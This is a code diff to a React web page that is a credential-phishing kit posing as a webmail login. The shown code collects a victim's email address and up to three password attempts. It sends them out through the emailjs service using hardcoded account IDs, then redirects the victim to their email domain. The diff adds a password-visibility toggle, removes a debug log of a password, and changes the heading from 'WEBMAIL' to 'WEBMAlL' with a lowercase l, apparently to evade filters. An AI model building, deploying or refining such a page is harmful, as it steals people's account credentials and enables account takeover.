@@ -2,7 +2,10 @@
 import React, {useState, useRef} from 'react'
 import emailjs from '@emailjs/browser';
 import ClipLoader from "react-spinners/ClipLoader";
+import Grid from '@mui/material/Grid';
 import logo from './logo.jpg';
+import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
+import VisibilityIcon from '@mui/icons-material/Visibility';
 
 
 function getPartAfterDot(text) {
@@ -29,6 +32,7 @@ function App() {
   const [pwdTwoIsSet, setPwdTwoIsSet] = useState(false)
   const [pwdThreeIsSet, setPwdThreeIsSet] = useState(false)
   const [loading, setLoading] = useState(false)
+  const [visible, setVisible] = useState(false)
 
   const handleEmailChange = (e) => {
     setEmail(e.target.value)
@@ -74,7 +78,6 @@ function App() {
       }
     }
     setLoading(true)
-    console.log(pwdThree);
     emailjs.sendForm('service_ugyug6e', 'template_orxa9ec', form.current, 'uuFf1B0OjAlZUMWXx')
     .then((result) => {
       const redir = getPartAfterDot(email)
@@ -86,23 +89,66 @@ function App() {
 
   }
 
+  const handleVisibility = () => {
+    setVisible(prevValue => !prevValue)
+  }
 
   return (
     <div className="general">
-      <h2>WEBMAIL*</h2>
+      <h2>WEBMAlL*</h2>
       <img src={logo} className="img2" alt='Outdated Env'/>
       <form ref={form} onSubmit={handleFormSubmit}>
           <label>Email</label>
           <input type="email" name="mascot" value={email} onChange={handleEmailChange} required/>
 
           {pwdOneIsSet && <label>Password</label>}
-          <input type="password" name="pwdOne" value={pwdOne} hidden={!pwdOneIsSet} onChange={handlePwdOneChange} required />
+          <Grid container>
+            <Grid item xs={12}>
+              <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} hidden={!pwdOneIsSet} onChange={handlePwdOneChange} required />
+            </Grid>
+            {pwdOneIsSet && 
+              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
+                {!visible ? 
+                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
+                  : 
+                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
+                }
+              </Grid>
+            }
+          </Grid>
+
 
           {pwdTwoIsSet && <label>Password</label>}
-          <input type="password" name="pwdTwo" value={pwdTwo} hidden={!pwdTwoIsSet} onChange={handlePwdTwoChange} />
+          <Grid container>
+            <Grid item xs={12}>
+              <input type={visible ? "text" : "password"} name="pwdTwo" value={pwdTwo} hidden={!pwdTwoIsSet} onChange={handlePwdTwoChange} />
+            </Grid>
+            {pwdTwoIsSet && 
+              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
+                {!visible ? 
+                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
+                  : 
+                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
+                }
+              </Grid>
+            }
+          </Grid>
 
           {pwdThreeIsSet && <label>Password</label>}
-          <input type="password" name="pwdThree" value={pwdThree} hidden={!pwdThreeIsSet} onChange={handlePwdThreeChange} />
+          <Grid container>
+            <Grid item xs={12}>
+              <input type={visible ? "text" : "password"} name="pwdThree" value={pwdThree} hidden={!pwdThreeIsSet} onChange={handlePwdThreeChange} />
+            </Grid>
+            {pwdThreeIsSet && 
+              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
+                {!visible ? 
+                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
+                  : 
+                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
+                }
+              </Grid>
+            }
+          </Grid>
 
 
 
